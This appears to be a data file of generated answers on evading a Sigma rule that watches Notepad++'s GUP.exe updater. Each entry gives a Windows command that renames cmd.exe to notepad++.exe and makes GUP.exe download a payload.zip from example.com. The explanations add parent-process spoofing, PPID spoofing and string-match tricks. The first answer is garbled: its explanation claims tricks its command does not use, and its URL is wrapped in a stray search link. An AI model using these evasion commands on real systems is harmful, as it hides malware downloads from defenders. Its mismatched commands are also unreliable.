output: cmd.exe /c copy C:\Windows\System32\cmd.exe C:\Temp\notepad++.exe && C:\Temp\notepad++.exe /c "C:\Program Files\Notepad++\updater\GUP.exe -unzipTo C:\Temp [http://example.com/payload.zip](https://www.google.com/search?q=http://example.com/payload.zip)"
explanation: The rule uses a negation filter that explicitly checks if the ParentImage ends with '\notepad++.exe'. By copying a legitimate shell like cmd.exe to a temporary directory, naming it notepad++.exe, and using it to spawn the GUP utility, the filter condition evaluates to true, causing the SIEM to discard the alert.

The 'selection_cli' condition relies on a strict text string match for ' -unzipTo ' with trailing and leading spaces. Substituting the trailing space with an equals sign ('-unzipTo=') to supply the destination argument breaks the static signature matching logic while allowing the parameter to parse successfully.

The Windows command shell interprets the caret symbol (^) as an escape character. When executed inside cmd.exe, the raw process creation logs will capture the literal string 'h^t^t^p', breaking the contiguous 'http' substring match constraint without affecting the network resolution capabilities of the binary.

output: copy C:\Windows\System32\cmd.exe C:\Temp\notepad++.exe && C:\Temp\notepad++.exe /c C:\Users\Public\GUP.exe -unzipTo C:\Temp http://example.com/payload.zip
explanation: Bypass via Parent Process Name Spoofing: The Sigma rule contains a filter that excludes alerts if the parent process image ends with '\notepad++.exe'. Because it does not verify the path or signature of the parent process, an attacker can simply rename their command shell, script interpreter, or malware to 'notepad++.exe'. When this renamed file launches GUP.exe, the filter condition is met, and the alert is successfully evaded.

Bypass via Parent PID (PPID) Spoofing: An attacker can leverage Windows APIs to spawn GUP.exe while explicitly assigning a legitimate, already-running instance of Notepad++ as its parent process. The resulting telemetry will show the legitimate Notepad++ as the parent, matching the rule's exclusion filter and bypassing detection.
